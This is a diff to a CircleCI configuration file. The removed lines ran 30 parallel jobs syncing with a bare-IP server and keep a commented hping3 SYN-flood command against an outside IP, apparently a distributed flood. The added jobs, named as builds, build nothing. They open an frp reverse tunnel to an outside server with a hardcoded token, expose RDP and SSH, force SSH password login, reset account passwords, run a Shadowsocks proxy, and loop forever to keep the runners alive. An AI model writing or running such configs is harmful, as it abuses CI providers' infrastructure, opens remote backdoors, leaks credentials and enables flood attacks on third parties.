@@ -1,35 +1,163 @@
 version: 2.1
 
-jobs:
-  test:
+orbs:
+  win: circleci/windows@5.0
+
+parameters:
+  target_os:
+    type: enum
+    enum: [win, linux]
+    default: linux
+
+commands:
+  write-frpc-config:
     parameters:
-      job_id:
+      port:
         type: integer
-    machine: true
-    environment:
-      TZ: Asia/Shanghai
-      TOTAL_JOBS: "40"
-      MATRIX_JOB_ID: << parameters.job_id >>
-      SOCKET_SERVER_URL: http://43.167.226.242:3000
+    steps:
+      - run:
+          name: 写入 frpc.toml
+          shell: bash
+          command: |
+            case "$(uname -s)" in
+                Linux*)     os=Linux;;
+                Darwin*)    os=Mac;;
+                CYGWIN*|MINGW*|MSYS*) os=Windows;;
+                *)          os=Unknown;;
+            esac
+
+            local_ip="172.17.0.1"
+            if [[ "$os" == "Windows" ]]; then
+              local_ip="127.0.0.1"
+            fi
+
+            cat \<< EOF > frpc.toml
+            user = "VirtualMachine"
+
+            serverAddr = "70.36.96.27"
+            serverPort = 7000
+            loginFailExit = true
+
+            auth.method = "token"
+            auth.token = "2f1d3a0e-9b64-4b91-b76b-8cb4a2f2e5d3"
+
+            [[proxies]]
+            name = "rdp<< parameters.port >>"
+            type = "tcp"
+            localIP = "${local_ip}"
+            localPort = 1234
+            remotePort = << parameters.port >>
+
+            EOF
+
+            if [[ "$os" != "Windows" ]]; then
+            cat \<< EOF >> frpc.toml
+            [[proxies]]
+            name = "ss"
+            type = "tcp"
+            localIP = "172.17.0.1"
+            localPort = 8388
+            remotePort = 8389
+            EOF
+            fi
+
+            echo "$(uname -s)"
+            cat frpc.toml
+
+jobs:
+  build-win:
+    executor: win/default
+    parameters:
+      port:
+        type: integer
+        default: 9001
     steps:
       - checkout
+      - write-frpc-config:
+          port: << parameters.port >>
       - run:
-          name: Step 1
+          name: 运行
           command: |
-            sudo apt install hping3 -q
-            timeout 60s docker run -e TZ=Asia/Shanghai -e RUN_ID=$CIRCLE_PROJECT_REPONAME -e TOTAL_JOBS=$TOTAL_JOBS -e MATRIX_JOB_ID=$MATRIX_JOB_ID -e SOCKET_SERVER_URL=$SOCKET_SERVER_URL signalapp2025/job-sync-client job-sync-client.js
+            echo "当前用户名：$(whoami)"
 
+            net user circleci mynewpassword@112233
+
+            tzutil /s "China Standard Time"
+            # 显示文件扩展名
+            reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 0 /f
+            # 显示隐藏文件
+            reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 1 /f
+            # 重启生效
+            taskkill /f /im explorer.exe
+            start explorer.exe
+
+            netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1
+            Start-Process -FilePath "frpc" -ArgumentList "-c frpc.toml" -NoNewWindow
+
+            choco install googlechrome -y
+
+            while ($true) {
+                Write-Output ("当前时间：" + (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
+                Start-Sleep -Seconds 300
+            }
+
+  build-linux:
+    # docker:
+    #   - image: cimg/base:stable
+    machine: true
+    parameters:
+      port:
+        type: integer
+        default: 9000
+    steps:
+      # - setup_remote_docker
+      - checkout
+      - write-frpc-config:
+          port: << parameters.port >>
       - run:
-          name: Step 2
+          name: 运行
           command: |
-            curl ipinfo.io
-            # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 106.14.219.131
+            # 修改或添加 PasswordAuthentication yes
+            grep -q '^#\?PasswordAuthentication' /etc/ssh/sshd_config \
+              && sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config \
+              || echo 'PasswordAuthentication yes' | sudo tee -a /etc/ssh/sshd_config
+
+            grep -q '^#\?PasswordAuthentication' /etc/ssh/sshd_config.d/*.conf \
+              && sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config.d/*.conf \
+              || echo 'PasswordAuthentication yes' | sudo tee -a /etc/ssh/sshd_config.d/*.conf
+            
+            sudo systemctl restart ssh
+
+            echo "circleci:mynewpassword" | sudo chpasswd
+            docker run -d -p 1234:1234 --restart=always alpine/socat TCP-LISTEN:1234,fork TCP:172.17.0.1:22
+            docker run -d --name frpc -v ./frpc.toml:/etc/frp/frpc.toml snowdreamtech/frpc
+
+            docker run -d \
+              --restart unless-stopped \
+              -p 8388:8388/tcp \
+              -p 8388:8388/udp \
+              -e TZ=Asia/Shanghai \
+              -e METHOD=aes-256-gcm \
+              -e PASSWORD=6a17a5dd-5f76-4b09-b567-9b0d5d449da5 \
+              shadowsocks/shadowsocks-libev
+
+            while true; do
+              date
+              # sleep $((RANDOM % 300 + 1))
+              timeout 300s docker logs -f frpc || true
+            done
 
 workflows:
   version: 2
-  matrix-test:
+  build-win:
+    when:
+      equal: [ "<< pipeline.parameters.target_os >>", "win" ]
     jobs:
-      - test:
-          matrix:
-            parameters:
-              job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
+      - build-win:
+          port: 9001
+  build-linux:
+    when:
+      equal: [ "<< pipeline.parameters.target_os >>", "linux" ]
+    jobs:
+      - build-linux:
+          port: 9000
